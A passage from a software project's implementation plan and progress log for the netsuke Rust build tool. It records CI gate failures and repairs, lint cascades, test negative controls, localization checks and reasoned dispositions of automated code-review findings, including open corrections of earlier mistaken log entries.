  **A scope fact worth carrying forward.** `make markdownlint` depends on
  `spelling`, which runs `typos-config-builder gate` with its default
  `scope=markdown` — the Makefile passes no `--scope`. The gate therefore scans
  tracked Markdown only, so a `-ise` typo in a `.rs` comment reds **no** gate
  and is caught only by CodeRabbit or by running `typos` by hand. The sweep was
  run manually for this reason.

  **`mdtablefix` and `markdownlint` measure different properties, and passing
  one says nothing about the other.** `make check-fmt` runs
  `mdtablefix --check --wrap --renumber --breaks --ellipsis --fences` as its
  *third* command, after `cargo fmt` and `ruff format --check`. On the first
  run of this repair pass it aborted at the first command, so the stage behind
  it had never executed; on the second run it executed and failed. Two files
  were non-canonical, and the fixes differ in kind, which is the point:

  1. A new glossary row was 504 columns against a table whose 26 other rows
     are 314. `--wrap` refills a table to a single width, so appending one
     over-long note would have re-padded every row — a 26-line whitespace diff
     concealing a one-line addition. The note was shortened to fit the
     existing width, keeping the attestation and the cited authority. The
     table's shape survives and the diff is the row that actually changed.
     `origin/main` was measured first and is canonical at 314, so this was the
     branch's own breakage rather than inherited drift.
  2. The new ExecPlan paragraphs were reflowed, because they had been written
     to a visual 80 columns rather than to `mdtablefix`'s fill point.

  Why (2) is invisible to every line-length check bears stating: `--wrap`
  *refills* to a fill point; it does not enforce a maximum. Every rewritten
  line was still under 80 columns, so MD013 saw nothing and `markdownlint`
  passed the whole time. A green `markdownlint` is therefore not evidence that
  `check-fmt` will pass, and the two gates should never be treated as redundant.

  The reflow was verified content-preserving rather than assumed to be:
  whitespace-normalizing the before and after revisions makes them
  byte-identical, and no table separator row appears in the diff. That check is
  cheap and worth repeating whenever this tool rewrites prose, because
  `--renumber` and `--wrap` both rewrite text the author wrote.

- [x] (2026-09-27) All seven gates green at `31ea3dc8`, and the branch is ready
  to push. The run is recorded here with its figures because the three runs
  that preceded it were each red on a *different* gate, and the sequence is the
  useful part of the record.

  `check-fmt` 2 s, `lint` 14 s, `typecheck` <1 s, `markdownlint` 14 s,
  `doc-coverage` 7 s, `test` 279 s, `nixie` 1 s. `make lint` passed with all
  four cascade stages confirmed run, so its problem count is exact and the
  lower-bound caveat does not apply. `make test` ran 3578 nextest tests (3578
  passed, 5 skipped) and both `Doc-tests` targets. `doc-coverage` is 98.83%
  (4815/4872) against an 80% threshold.

  **Three red runs, three different gates — and each one was masked by the one
  before it.** `check-fmt` aborted at its first command on a rustfmt diff,
  hiding `ruff format --check` and `mdtablefix --check`. Once the rustfmt diff
  was fixed, `mdtablefix --check` ran for the first time and failed.
  `markdownlint` aborted in its `spelling` prerequisite, hiding
  `markdownlint-cli2` entirely. Each repair was necessary and none was
  sufficient, which is exactly what "a gate reports a lower bound" means in
  practice. A repair pass should therefore re-run the whole gate from the start
  rather than resuming at the stage that failed — resuming would have left
  `mdtablefix` unmeasured for a third time.

  **The load-sensitive test did not flake.** The 300 s-capped
  `packaged_manifest_retains_build_script_sources` passed at 197.470 s against
  its cap, some 102 s of headroom, on a host whose 1-minute load reached 61.33
  on 24 cores while two mutation-testing containers from another agent were up.
  It was tracked across three runs here — 217.5 s, then 197.5 s — because the
  plan's own note says such a timeout must be read as load-induced rather than
  as a code failure, and that reading is only defensible against recorded
  numbers.

  **Nothing was assumed from the previous run.** The gate logs at the canonical
  `/tmp` paths are keyed by *branch*, not by revision, so a run on one commit
  overwrites the evidence for another. This run found a peer session's logs for
  the parent commit occupying those same paths and set them aside before its
  own run rewrote them. The general hazard is worth recording beside the
  rebase-provenance rule: a log file is only evidence for the revision it
  names, and the path alone does not name one.

- [x] (2026-09-27) The disposition log at `c2b3e32e` was corrected a third
  time, and finding 12 applied at the one site the first two passes missed.

  **What forced the third pass.** A completeness check over the triage entry —
  does every numbered finding appear in it, and can every item be found in the
  review's log — failed on both halves at once. The entry omitted finding 14
  (`Status: IN PROGRESS`, the one finding about this document) and carried an
  item with no counterpart: "three execplan prose findings (dash spacing, a
  `shell_escape` mention …)". `grep` for `dash` and `shell_escape` across the
  review's JSONL returns nothing. That fabricated item had survived the rewrite
  that condemned fabricating it, because the items were written from the old
  entry's shape rather than by reading the parsed list to the end.

  **A fourth failure, of the same kind and found by a different check.** The
  entry then asserted a "narrower fix applied" to the German and Czech
  catalogues — an edit that was never made. Grepping the files for the changed
  text showed them unchanged. This mattered because the finding was about to be
  *declined*, and inventing a partial fix is a way of appearing to engage with
  a finding while changing nothing. The declines now rest on evidence: German's
  main-owned precedent is
  `flatten erwartete Sequenzelemente, fand aber { $kind }` and Czech's is
  `flatten očekával prvky posloupnosti, ale nalezl { $kind }` — both at `:342`
  on `origin/main` (each quoted to its final token, without the sentence-final
  period) — and both name the helper as subject with a verb of the same gender
  and number as the new lines use, so the new lines follow their catalogues
  rather than diverging from them. `{ $kind }` renders MiniJinja's own
  `ValueKind` labels, which are fixed Latin, so the nominative-position demand
  has nothing to attach to.

  **Finding 12's fourth site.** The first correction pass fixed the plan's
  `Surprises & discoveries` narrative and the `dialect_probes.rs` comment, and
  this plan's own summary at `:2686` still read "the divergence this sentence
  originally claimed is unobservable" — the summary asserting the old claim
  while the narrative recorded it as corrected. Only grepping the plan for the
  claim itself found it, which is the reusable part: a correction is not
  complete until every site repeating the claim has been visited, and the sites
  are not all in the places the finding names.

  Commits `6365240a`, `22e8b092`, `16646c68`; the last removes a first-person
  "which I measured" that the replacement item had introduced two paragraphs
  below its own note explaining why the pronoun was removed. Pushed, so the
  remote is at `16646c68`.

## Blocked / open questions

### Gate run at `6719ddcb` (2026-09-27) — RED, four of seven

The historical table below records the `149685d3` plateau. This run supersedes
it. Four gates failed, from four distinct defects; `make typecheck` and
`make nixie` passed. Logs are cited so they can be read rather than re-run.

| Gate                | Result | Log                                              | Cause                                                                   |
| ------------------- | ------ | ------------------------------------------------ | ----------------------------------------------------------------------- |
| `make check-fmt`    | FAIL   | `/tmp/check-fmt-6719ddcb-20260927T062509.out`    | `mdtablefix --check` on 5 Markdown files                                |
| `make lint`         | FAIL   | `/tmp/lint-6719ddcb-20260927T062509.out`         | `lint-clippy`'s `cargo doc` half; 3 later stages never ran              |
| `make typecheck`    | pass   | `/tmp/typecheck-6719ddcb-20260927T062509.out`    | —                                                                       |
| `make markdownlint` | FAIL   | `/tmp/markdownlint-6719ddcb-20260927T062509.out` | `spelling` prerequisite; `mdlint` never ran                             |
| `make doc-coverage` | FAIL   | `/tmp/doc-coverage-6719ddcb-20260927T062509.out` | same rustdoc defect as `lint`                                           |
| `make test`         | FAIL   | `/tmp/test-6719ddcb-20260927T062509.out`         | 2 dialect-telemetry tests; cancelled 172 others, so `doctest` never ran |
| `make nixie`        | pass   | `/tmp/nixie-6719ddcb-20260927T062509.out`        | —                                                                       |

- **One defect failed two gates.** `DIALECT_VALUES` is `pub`, but its doc
  comment linked `crate::shell_word::ShellDialect`, which is `pub(crate)`. Under
  `-D rustdoc::private-intra-doc-links` that is an error in both `cargo doc`
  (`make lint`) and `make doc-coverage`. Fixed by demoting the link to a code
  span; the encoder type is private by design, so widening it to satisfy a doc
  link would have been the wrong repair.
- **The two test failures were real defects in the test, not the product.**
  `recorded_render` bound only `value => "a b"`, but `shell_join` requires a
  sequence, so both `shell_join` cases failed on the subject-kind check before
  reaching the assertion. Fixed by binding `items => ["a", "b"]` alongside and
  pointing the `shell_join` templates at it. The `shell_quote` binding is
  unchanged, since that filter's subject genuinely is one string.
- **`hand-written` → `handwritten`** at
  `src/observability_recorder_dialect_tests.rs:160`. `typos.toml` already pins
  `"handwritten" = "handwritten"`, so this was the file contradicting an
  existing entry rather than the dictionary needing a new one.
- **`mdtablefix` reflow over 5 files** is mechanical. Note the tool is run by
  the gate with `--wrap --renumber --breaks --ellipsis --fences`, so the
  project's own `make fmt` target is the correct repair and a hand edit is not.

Consequence recorded for the retrospective: `make test` cancelled 172 tests and
never reached `doctest`. The suite is therefore *unverified* at this SHA, not
merely failing, and the re-run must be the whole gate set rather than only the
four that failed.

### Defects the first repair unmasked (2026-09-27)

Fixing the four `6719ddcb` defects exposed two further ones that the cascade
had been hiding. This is the second time on this branch that a "fix everything
the gate reported" pass turned out to be incomplete, so the lesson is recorded
rather than just the fixes.

- **`clippy::excessive_nesting`** at
  `src/observability_recorder_dialect_tests.rs:189`, on an inline closure
  inside the generator loops. It was masked because `cargo doc` aborts
  `lint-clippy` *before* `cargo clippy` runs, and `cargo doc` was the failing
  half. Repaired by extracting the `dialect_pair` free function.
- **Whitaker `no_expect_outside_tests`**, three errors in `recorded_render`.
  Masked by both earlier `lint-clippy` aborts. The lint recognizes a function
  as test-like only by its *attribute* — `#[test]`, `#[rstest]`, and a fixed
  list of path forms — **not** by an enclosing `#[cfg(test)]` module. So a
  helper inside a `#[cfg(test)] mod tests` is still "outside test-only code" to
  this lint. Repaired by making `recorded_render` return `anyhow::Result<_>`
  and propagating with `?`, with each of the three call sites unwrapping inside
  a recognized `#[rstest]`/`#[test]` body. This matches the sibling convention:
  `observability_recorder_file_read_tests.rs` and its siblings contain zero
  `expect(` calls.

**Consequence for the re-run.** Because `make lint` aborts at the first failing
stage, a single `cargo doc` error concealed a clippy error and a Whitaker error
behind it. "The gate reported N problems" is therefore a lower bound, not a
count: each repair pass can reveal new ones, and only a fully green `make lint`
shows the stage list was exhausted.

### Spelling sweep over the branch delta (2026-09-27)

House style is en-GB-oxendict (`-ize`/`-ization`), confirmed by the `-ise`
family sweep over added lines. Five genuine `-ise` instances were found in *my*
delta and fixed: `recognise`/`recognises` in
`tests/std_filter_tests/collection_filters/compact_property.rs`,
`src/observability_recorder_dialect_tests.rs`,
`src/stdlib/config/recipe_shell.rs`; `localised` in
`src/stdlib/recipe_text/mod.rs`; and `unparseable` → `unparsable` in
`src/shell_word.rs` (the dictionary prefers the latter; the repo carries both,
but only mine was in scope).

Two classes were deliberately **kept**:

- `localised`/`localisation` in `tests/features/*.feature`. Four pre-existing
  scenarios across `cli.feature`, `locale_resolution.feature`, and
  `stdlib.feature` already use that spelling; my added scenario matches the
  established Gherkin vocabulary. Changing only my line would make the file
  internally inconsistent.
- `defualt` in `tests/manifest_env_tests/default_argument.rs`. It is the typo
  under test in a negative test, and the surrounding comment says so.

**Scope note worth keeping:** `make markdownlint` depends on `spelling`, which
runs `typos-config-builder gate`, whose `scope` **defaults to `markdown`** —
the Makefile passes no `--scope`, so the gate scans tracked Markdown only. A
`-ise` typo in a `.rs` comment therefore does **not** red any gate; it is
caught only by a CodeRabbit review or by running `typos` directly. Hence the
manual sweep above rather than relying on the gates to surface it.

### Historical: all seven gates green at `149685d3`

| Gate                | Result | Duration | Note                                                                        |
| ------------------- | ------ | -------- | --------------------------------------------------------------------------- |
| `make check-fmt`    | pass   | 2s       | `cargo fmt`, Ruff over 123 files, mdtablefix 165 unchanged                  |
| `make lint`         | pass   | 14s      | clippy, whitaker (both invocations), pylint 10.00/10, yamllint + actionlint |
| `make typecheck`    | pass   | 1s       | `ty check` and `cargo check --all-targets --all-features`                   |
| `make markdownlint` | pass   | 12s      | `spelling` passed, then MDLINT 0 errors over 165 files                      |
| `make doc-coverage` | pass   | 8s       | 98.82% (4772/4829) against the 80% threshold                                |
| `make test`         | pass   | 391s     | nextest 3471/3471 passed, 5 skipped; 129 doctests                           |
| `make nixie`        | pass   | 1s       | all diagrams validated                                                      |

`make test-podman` was not run at that plateau: no path under `ansible/` is in
the change surface.

## Outcomes & retrospective

Written at EP-M5, which is complete. All three reconciliation items below are
discharged, so the plan is `COMPLETE`; each is kept in place, with its outcome,
because the *condition* it states is what a future reader needs — a tick alone
would not say what would have blocked the plan. Every discovery was reconciled
against the `Conformance basis` before the status was changed:

- D2 is a deviation from `RFC-0006-8.9`. It must be recorded in ADR-041 and the
  RFC amended, or the plan stays `BLOCKED`. **Discharged.** ADR-041 records the
  deviation and its consequences; `RFC-0006-8.9` and the §13.3/roadmap
  cross-references were amended to name the supersession and the wider dialect
  set.
- `RM-6.8.3` is materially reduced by D1 and D2. Record the reduction as a note
  on that roadmap entry; do not tick it, because its `dialect` value set is
  wider than what ships here. **Discharged.** `docs/roadmap.md:1197` remains
  unticked and carries the note: 3.14.8 delivered the canonical name, the
  `dialect` argument, and the single implementation, leaving the wider RFC 0006
  dialect set — `bash` in particular, which this work deliberately refuses.
- If EP-M4's runner plumbing proves larger than tolerance 1 allows, stop and
  record the measurement. Do **not** resolve it by shipping the
  host-default-only behaviour and deferring the plumbing: that recreates R11's
  silent-corruption path, which constraint 10 forbids. The correct escalation
  is to propose deferring the *filters* as well, leaving EP-M1 to EP-M3
  shipped, and to raise the plumbing as its own roadmap item. **Not
  triggered.** The plumbing landed inside tolerance: `resolve_recipe_shell()`
  is reached on the build path, and the bootstrapping escape (`execute_help`
  returning before the resolution) is documented as deliberate in both
  registration surfaces.

### What the work cost, and what it taught

**The dominant cost was not the feature; it was the lint and gate surface.**
The filter implementation itself was the small part. The recurring expense was
satisfying `make lint`'s cascade — `cargo doc`, `cargo clippy`, Whitaker,
pylint, and the workflow lints — where each stage's failure hides every later
stage's. That cascade was the direct cause of two full extra gate cycles: first
four defects at `6719ddcb`, then **two more that the first four had
concealed**. The transferable lesson is in `Blocked / open questions`: a gate's
reported problem count is a lower bound, so "I fixed everything it printed"
does not imply "it will pass".

**A related trap is scope, not severity.** The `spelling` prerequisite of
`make markdownlint` runs with `scope=markdown`, so an `-ise` typo in `.rs`
comments reds nothing. Passing gates were therefore never evidence that this
class was clean, and a manual `typos` sweep over the branch delta was required.
The general form: when a gate's *scope* is narrower than the change surface,
its green result is silent about the difference, and that difference is exactly
where a reviewer will look.

**What went well.** Verifying claims against the vendored dependency rather
than reasoning about them paid off twice: `select`'s `is_true()` semantics and
the private-intra-doc-link rule were both checked against source before acting,
so neither needed a second attempt. The same applied to the `RecipeShell` →
`ShellDialect` three-to-two surjection, which drove the test design.

**A residual risk, stated plainly.** The build and query registration surfaces
resolve their default dialect by different routes — the build honours
`NETSUKE_WINDOWS_SHELL`; the query surface takes `host_default()`. On a Windows
host configured for Bash, one manifest expression can render `sh` quoting for
the build and PowerShell quoting for `help targets`. This is *masked*, not
absent: `execute_help` returns before `resolve_recipe_shell()` is called, and
both `register_query_helpers` and `ManifestLoadMode::ManifestQuery` document
the divergence as deliberate. `docs/developers-guide.md` previously claimed the
surfaces "agree on every dialect", which was false; that claim is corrected.

## Artefacts and notes

To be filled during implementation. Required entries:

1. The `red` transcript for EP-M1 showing the unknown-keyword failure.

   **Entry 1 — EP-M1 red (2026-09-19).** Recorded before any production change,
   against the post-extraction tree with only the two new localization keys and
   the new tests in place. The invocation is
   `cargo nextest run -E 'binary(manifest_env_tests)'`; the `--test` form does
   not select an integration binary here (the binary is
   `netsuke-build::manifest_env_tests`).

   ```text
   FAIL [   0.031s] netsuke-build::manifest_env_tests template_default_substitutes_for_absence::case_absent_uses_default
   FAIL [   0.028s] netsuke-build::manifest_env_tests explicit_none_default_is_equivalent_to_omitting_it
   FAIL [   0.041s] netsuke-build::manifest_env_tests a_non_string_default_is_rejected::case_1_number
   FAIL [   0.036s] netsuke-build::manifest_env_tests a_non_string_default_is_rejected::case_2_boolean
   FAIL [   0.033s] netsuke-build::manifest_env_tests a_non_string_default_is_rejected::case_3_sequence
   FAIL [   0.039s] netsuke-build::manifest_env_tests a_non_string_default_is_rejected::case_4_mapping
   FAIL [   0.025s] netsuke-build::manifest_env_tests a_blocked_lookup_still_fails_when_a_default_is_supplied
   FAIL [   0.019s] netsuke-build::manifest_env_tests a_positional_second_argument_is_rejected
   FAIL [   0.033s] netsuke-build::manifest_env_tests an_unknown_keyword_argument_is_rejected
   ```

   The failure text is the intended one — the keyword is not recognized, which
   is exactly the arity defect the milestone removes:

   ```text
   unexpected error: Failed to load manifest at <path>: invalid operation:
   unknown keyword argument 'default' (in <string>:1)
   ```

   After the implementation the same selection reports
   `24 tests run: 24 passed, 0 skipped`. Note that
   `an_unknown_keyword_argument_is_rejected` stays green in both runs: it uses
   a *deliberate* typo (`defualt=`), so it is a regression guard on
   `assert_all_used`, not a red test for `default=`.

   **Entry 1b — the query-surface half.**
   `tests/stdlib_manifest_query_tests.rs` was red for a different reason: the
   disabled `env` stub still took one argument, so `env('X', default='y')` on
   the query surface died with a detail-free `too many arguments` instead of
   the disabled marker. That is the exact failure mode the file's doc comment
   describes, and it was observed before the stub was widened to `Kwargs`.

   **Entry 3a — the EP-M2 negative control, naive truthiness (2026-09-19).**
   `is_blank` was temporarily replaced with `!value.is_true()`, making
   `compact` drop every falsy member, and the EP-M2 selection re-run. Three
   tests failed, which is what makes the witness case and the property
   load-bearing rather than decorative — a truthiness implementation would
   otherwise pass both:

   ```text
   FAIL std_filter_tests::collection_filters::compact_property::compact_is_order_preserving_and_idempotent
   FAIL std_filter_tests::collection_filters::compact_drops_witness_case_blanks_only
        Error: compact must drop only none, undefined and the empty string, but rendered x
   FAIL bdd_tests::features_scenarios::stdlib_compact_drops_empty_strings_and_nulls_but_keeps_falsy_values
        expected stdlib output 'a,0,False,b', got 'a,b'
   Summary: 14 tests run: 11 passed, 3 failed
   ```

   The BDD failure is the sharpest of the three: `'a,b'` is exactly the
   signature of the naive implementation eating `0` and `false`, and it is
   visible in the user-facing scenario rather than only in a unit test. The
   other two EP-M2 controls listed in this entry belong to later milestones and
   are not yet run.
2. The name of the snapshot that failed during the OBL-NINJA-STABLE
   non-vacuity check, and the transcript showing it passing again after revert.

   **Entry 2 — OBL-NINJA-STABLE non-vacuity (2026-09-19, EP-M3).** Baseline
   first: `cargo nextest run --all-features --test ninja_snapshot_tests` →
   `7 tests run: 7 passed, 0 skipped`. The break replaced `quote_word`'s `Sh`
   arm with `format!("\"{value}\"").into_bytes()` — a double-quoted word where
   the minimal quoter emits a single-quoted one, the exact defect the plan's
   method names. Five of the seven snapshots failed; the first, and the name
   this entry exists to record — `7 tests run: 3 passed, 4 failed, 0 skipped`:

   ```text
   FAIL [   0.136s] netsuke-build::ninja_snapshot_tests conditional_manifest_ninja_snapshot
       Snapshot file: tests/snapshots/ninja/ninja_snapshot_tests__conditional_manifest_ninja.snap
       Source: tests/ninja_snapshot_tests.rs:141
   snapshot assertion for 'conditional_manifest_ninja' failed in line 141
   ```

   The other three failures were `implicit_deps_manifest_ninja` (line 264),
   `command_available_manifest_ninja` (line 197), and `touch_manifest_ninja`
   (line 69). The three that passed were
   `conditional_action_deps::conditional_action_deps_ninja_snapshot`,
   `dependency_only_manifest_ninja_snapshot`, and
   `multi_command_manifest_ninja_snapshot` — the last of which carries a
   multi-entry command list and yet does not discriminate, because it never
   reaches the encoder at all: `tests/data/multi_command.yml` declares no
   `ins:` /`outs:` and uses no `{{ ins }}`/`{{ outs }}` placeholder, so
   `CommandBindings::new` is handed empty slices and `quote_path` has no path
   to quote. Its three recipe entries are the only commands in the file and all
   three are literal shell text. That is a real limit on what this check
   proves: it demonstrates the snapshot suite notices *a* quoting change, not
   that it covers every quoting path. A fixture that dropped
   `">{{ outs }}"`-style text through the four POSIX quote contexts would
   discriminate; none of the seven does. Reverting the arm and re-running
   returned `7 tests run: 7 passed, 0 skipped`.

   **`make test-nextest`, not `cargo nextest run --all-features`, needs to be
   the acceptance evidence** — this run selected one integration binary to keep
   the check cheap and targeted, and the milestone's stated acceptance evidence
   is the whole suite. The scoped run is what proves the *snapshots* respond;
   the full gate run below proves nothing else moved.

   Insta writes a `.snap.new` beside each failure. Four were produced and all
   four were deleted before the revert run, so no rejection artefact could be
   mistaken for a pending snapshot.
   `git status --short src/snapshots tests/snapshots` printed nothing after the
   revert run.

   Provenance note: the break was made, observed, and reverted in this
   worktree, and the transcript above is quoted from
   `/tmp/ninja-snapshot-nonvacuity-…out`, not reconstructed.

3. The transcript of each negative control failing as designed
   (naive double-quote quoter, naive `join(" ")`, naive truthiness `compact`,
   POSIX-quoted input fed to the PowerShell decoder).
4. The real `shell-quote` output for the witness `a b '$HOME'`, used to correct
   the BDD expectations and the "Validation and acceptance" transcript.
5. `git status --short src/snapshots tests/snapshots` showing no output at each
   milestone boundary.
6. The CodeRabbit pass at each milestone.

   **Entry 6 — EP-M1 CodeRabbit pass (2026-09-19).** Run by `scrutineer` as
   `coderabbit review --agent` against `5d66db48`. It completed without rate
   limiting: 18 raw findings over 49 files, 5 of them exact duplicates, so 13
   unique. **The PR channel is not the same channel**: PR #702 is a draft, and
   CodeRabbit posts nothing to a draft, so all 13 findings exist only in the
   agent output — a reviewer looking at the PR would see the CodeRabbit check
   pass with "Review skipped: draft pull request" and no findings at all.

   Disposition: 7 plan-document fixes and 2 code fixes applied (see EP-M1a in
   `Progress`); 4 rejected.

   The 4 rejected findings were translation-wording complaints against the `nl`,
   `nb`, `id`, and `it` catalogues. Each quoted specific text as being present
   *and* as being the suggested replacement, and the quoted present text exists
   in no catalogue in any locale:

   ```text
   nl  "maar er werd { $kind } ontvangen"      -> not found in locales/
   nb  "men den mottatte typen var { $kind }"  -> not found in locales/
   id  "tetapi yang diterima adalah { $kind }" -> not found in locales/
   it  "ma il tipo ricevuto è { $kind }"       -> not found in locales/
   ```

   The actual lines are
   `De default van env moet een tekenreeks zijn, ontvangen { $kind }.` (nl),
   `default i env må være en streng, mottok { $kind }.` (nb),
   `default pada env harus berupa untai, menerima { $kind }.` (id), and
   `Il default di env deve essere una stringa, ricevuto { $kind }.` (it) — each
   a faithful rendering of the en-US source's own terse detached participle.
   That only 4 of 35 catalogues were flagged, and that all four suggested
   rewrites add words the source does not carry, both point to evaluator
   variance rather than a consistent rule. Rejected and recorded here so the
   decision is auditable rather than silent.

   Two further findings were **not** acted on, deliberately. CodeScene flags
   `tests/manifest_env_tests.rs` for duplication between
   `a_positional_second_argument_is_rejected` and
   `an_unknown_keyword_argument_is_rejected`; the split into
   `default_argument.rs` shared their bodies through
   `ensure_template_is_rejected`, which addresses it. And CodeRabbit notes no
   parity test exists between `register_with_config` and
   `register_manifest_query`; the plan already records that as a future roadmap
   item and out of scope here (see `Surprises & discoveries`).

   **Entry 6 (continued) — EP-M1 confirmation pass (2026-09-19, 06:44).** After
   the EP-M1a fixes landed as commit `d2c6f573`, the review was re-run and
   returned 16 fresh findings. Provenance matters here and is easy to get
   wrong: the pass reviewed the tree *as it stood at 06:44*, which is
   `d2c6f573` plus the uncommitted plan edits — no EP-M2 code existed yet (the
   first EP-M2 file was written at 08:16). It is therefore a second look at
   EP-M1's localization and at the EP-M1a plan fixes, **not** a review of
   `compact`. Disposition: 3 plan fixes applied, 9 findings rejected, all of
   them below.

   Two of its results are worth carrying forward. First, it independently
   re-derived the localization findings EP-M1 had already rejected: 8 of the 16
   are wording complaints against `pl`, `ru`, `de`, `es-419`, `da`, `el`, and
   `cy` — the same `{ $kind }`-inflection and untranslated-`default`
   objections, on catalogues untouched since. That a second pass on an
   unchanged file reproduces the same objections while a reviewer-visible PR
   shows nothing (the PR is a draft, so CodeRabbit posts no comments) is the
   reason each rejection is written down rather than simply dismissed: a third
   pass will raise them again, and the answer should not have to be
   rediscovered. Second, three of its plan findings — AXIOM-4 contradicting D4,
   EP-M4 re-adding `src/shell_word.rs`, and the invalid `8a`/`8b` markers —
   were real defects in the plan text that the EP-M1 pass had not surfaced, so
   the confirmation pass earned its cost.

   It also produced the one finding rejected as outright false. Finding 9
   reports an unmatched single quote in the `RUSTFLAGS` acceptance transcript
   at line 2220, claiming the quoting is unbalanced and that a matching
   word-count command carries the same defect. Both are balanced, and running
   them settles it. The first is `set -- -D' warnings -C target-cpu'=native''`;
   the shell strips the quotes and the inner `sh` receives
   `<-D warnings -C target-cpu=native>`, reporting one positional parameter —
   which is the plan's whole claim. The second is the *deliberately defective*
   contrast case the paragraph uses to warn the reader off double-quoting, and
   its quotes pair up too: it passes `sh -n` and prints exactly
   `RUSTFLAGS=-D' warnings'`, the corrupt value it is warning about. Reading
   balanced quoting as an imbalance is the finding's error; neither command is
   changed:

   ```text
   $ sh -c "set -- -D' warnings -C target-cpu'=native''; echo \$#"
   1
   $ sh -c 'printf "%s\n" "RUSTFLAGS=-D'"'"' warnings'"'"'"'
   RUSTFLAGS=-D' warnings'
   ```

   The transcript's quoting is deliberately awkward because it transcribes a
   value that must survive two shells; simplifying it to satisfy a reader the
   transcript's own `sh -n` check already contradicts would make the document
   *less* faithful to the command that ran.

   **Applied in this pass (3).** Findings 10 and 15 are the same defect twice:
   substeps `8a` and `8b` in EP-M5's `- Work:` list use `.`-less markers that
   no Markdown ordered list recognizes. Renumbered to `9.` and `10.`, cascading
   the trailing items to `11`–`15`. Findings 11 and 13 are likewise one defect:
   EP-M4's Green step told the implementer to add `src/shell_word.rs`, which
   EP-M3 already creates in the immediately preceding milestone. Replaced with
   the instruction to reuse the EP-M3 module and seam. Findings 12 and 16 are
   the same defect again, and the most substantive of the three: AXIOM-4 claimed
   `Kwargs::get::<Option<Value>>` could distinguish an explicit `none` from a
   defined value through `Value::is_none`/`is_undefined`. It cannot — absent,
   `none`, and undefined all map to `Ok(None)`, as D4 already said at lines
   679–686 and as the `Surprises & discoveries` entry above records. The axiom
   contradicted the plan's own decision log; AXIOM-4 now states the collapse
   and points at D4.

   **Locales (8 findings, all rejected).** Findings 1, 2, 7, and 14 ask for
   grammatical recasting of `{ $kind }` in `pl`, `ru`, and `el`; findings 3, 4,
   5, and 8 ask for `default` to be replaced by a native term in `de`, `es-419`,
   `da`, and `cy`. Both requests are declined, and the evidence is not a
   matter of taste.

   For `default`: the token is untranslated in **all 35 catalogues**, including
   the `en-US` source itself, which reads
   `env default must be a string, received { $kind }.` The word names the
   manifest helper's own keyword — `env(name, default=…)` — which users type
   literally, and `docs/translators-guide.md` makes that the policy: "Leave
   Netsuke's own identifiers untranslated — users type them." The same guide
   names `env`'s sibling identifiers (`foreach`, `when`, `vars`, `cwd_mode`,
   `with_suffix`, `group_by`) as covered by that rule. Replacing the token in
   four catalogues would also desynchronize them from the other 31 for no
   reader's benefit, since a user who mistypes `default=` gets an error naming
   `default=`.

   ```text
   cs  Hodnota default v env musí být řetězec, obdrženo { $kind }.
   ru  Значение default в env должно быть строкой, получено { $kind }.
   de  Der default von env muss eine Zeichenkette sein, empfangen wurde { $kind }.
   cy  Rhaid i default env fod yn llinyn, derbyniwyd { $kind }.
   ```

   For the `{ $kind }` placement in `el` and `pl`: the pattern is the existing
   house idiom, not a new one. `stdlib.collections.flatten.expected_sequence`
   has shipped the identical construction in the same catalogues since before
   this plan existed — `el` reads
   `Το flatten περίμενε στοιχεία ακολουθίας αλλά βρήκε { $kind }.` for
   `flatten`, and the new `compact` line reads
   `Το compact περιμένει ακολουθία αλλά βρήκε { $kind }.`. `pl` ends both with
   `napotkał { $kind }`. Inflecting a whole-catalogue idiom to satisfy a
   one-message preference would make `compact` disagree with `flatten` sitting
   directly above it in the same file.

   The shape is worth naming: of 16 findings, 12 were three defects reported
   twice each, and the localization group repeats one evaluator preference
   across seven locales. As with EP-M1's four rejected translation findings,
   each rejected item is recorded so the decision is auditable rather than
   silent.

   **Entry 6 (continued) — EP-M2 review pass (2026-09-19, 12:48–12:54).** Run by
   `scrutineer` as `coderabbit review --agent`, exit 0, no rate limiting,
   `review_completed`, 17 findings over 58 files. Raw JSONL is
   `/tmp/coderabbit-netsuke-3-14-8-jinja-epm2.out`. The `reviewedFiles` list is
   the proof of revision: it covers the EP-M1 and EP-M2 files
   (`src/manifest/env_reader.rs`, `src/stdlib/collections.rs`,
   `tests/std_filter_tests/collection_filters/compact_tests.rs`, all 35
   catalogues, and the plan) and contains **no** EP-M3 file, confirming the
   review ran against `d8b01bd2` and that EP-M3's edits are not yet reviewed.

   Of the 17 findings, none was applied, and the reason is the same in every
   case: **each describes a state the tree is not in.** They fall into four
   groups.

   *Rejected against a settled decision (1 finding — 11).* Finding 11 (major)
   reads `src/stdlib/collections.rs:119` and asks that the guard accept only
   `ValueKind::Seq` rather than `Seq | Iterable`, adding a
   `Value::make_iterable` regression test. **The guard is correct as written
   and the finding is declined.** Decision D8 states that `compact` and
   `shell_join` accept "only `ValueKind::Seq` and `ValueKind::Iterable`; every
   other kind, `Map`, `String`, `None`, and `Undefined` included, raises an
   error naming the received kind", and EP-M4's Green step repeats that
   acceptance verbatim. The shipped predicate is
   `!matches!(kind, ValueKind::Seq | ValueKind::Iterable)`, which is exactly
   the decision. Narrowing to `Seq` alone would reject the sequence-shaped
   values minijinja hands back for some generators, which is the opposite of
   D8's intent — D8 exists to reject *maps and strings*, not to reject
   iterables. The reviewer's premise is a misreading of the guard's polarity,
   not a defect in it.

   *(Superseded — my first draft of this entry claimed the tree "already
   accepts only `Seq`" and dismissed the finding as stale. That was wrong:
   `src/stdlib/collections.rs:119` reads
   `ValueKind::Seq | ValueKind::Iterable`, so the reviewer described the code
   accurately. The finding is still declined, but on the grounds above — the
   code matches a recorded decision, not because the reviewer misread the tree.
   Recorded because the error was mine and the distinction is the whole point
   of keeping this log.)*

   *Already satisfied (4 findings — 13, 16, and the pair 12/15).* Findings 13
   and 16 (both major) read EP-M3's conformance check — "exactly one
   recipe-shell quoting implementation remains" — as a claim about
   `QuoteRefExt::quoted` **call sites**, find two, and ask that the requirement
   be tightened to "zero outside the two exemptions". The reading is the error:
   the sentence constrains *implementations of recipe-shell quoting*, and it is
   satisfied. There are indeed two `.quoted(` sites, both intended —
   `src/shell_word.rs:65`, the single sanctioned encoder, and
   `src/stdlib/command/quote.rs:100`, whose divergence is the `cmd.exe` quoting
   the same conformance check requires to stay untouched. Note also that at
   EP-M3 neither site carries an `#[expect]`: the `clippy.toml` entry and both
   attributes land in EP-M4, because adding the entry in EP-M3 would
   immediately make `quote.rs` a violation and force an edit that EP-M3's
   conformance check forbids. Findings 12 and 15 (both major) ask that the
   EP-M4 acceptance checklist name `tests/shell_filter_composition_tests.rs`
